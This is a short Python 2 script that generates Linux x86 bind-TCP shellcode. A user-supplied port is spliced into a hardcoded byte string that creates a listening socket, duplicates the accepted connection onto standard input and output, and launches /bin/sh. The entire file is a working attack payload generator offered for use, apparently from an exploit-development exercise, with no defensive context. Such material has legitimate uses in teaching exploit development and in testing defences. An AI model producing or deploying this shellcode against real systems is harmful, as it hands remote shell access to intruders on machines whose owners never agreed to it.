#!/usr/bin/python
# generator.py
#  - Generate bind tcp shellcode

import sys

if (len(sys.argv) != 2):
	print "Usage: %s <port>" % sys.argv[0]
	print "\tNote: Port must be between 256 and 65535 to avoid nulls"
	sys.exit()

try:
	port = int(sys.argv[1])
	if (port < 256 or port > 65535):
		raise ValueError
except ValueError:
	sys.exit("[-] Please enter a valid port")

port_hex = hex(port)[2:]
len_hex = len(port_hex)
if (len_hex == 4):
	port_op = "\\x"+port_hex[0:2]+"\\x"+port_hex[2:4]
elif (len_hex == 3):
	port_op = "\\x0"+port_hex[0]+"\\x"+port_hex[1:3]
else:
	sys.exit("[-] Please enter a valid port")

code = (
"\\x31\\xc0\\x50\\x40\\x50\\x89\\xc3\\x40\\x89\\xc7"
"\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31"
"\\xc0\\x50\\x66\\x68"+port_op+"\\x66\\x57\\x89\\xe1"
"\\xb0\\x10\\x50\\x51\\x56\\xb0\\x66\\x89\\xfb\\x89"
"\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x56\\xb0\\x66\\xb3"
"\\x04\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\x56"
"\\xb0\\x66\\xb3\\x05\\x89\\xe1\\xcd\\x80\\x89\\xc3"
"\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80"
"\\x49\\x79\\xf7\\x31\\xc9\\x51\\x68\\x2f\\x2f\\x73"
"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89"
"\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

len = len(code)/4
print "Shellcode Length: %d" % len
print "\"%s\"" % code
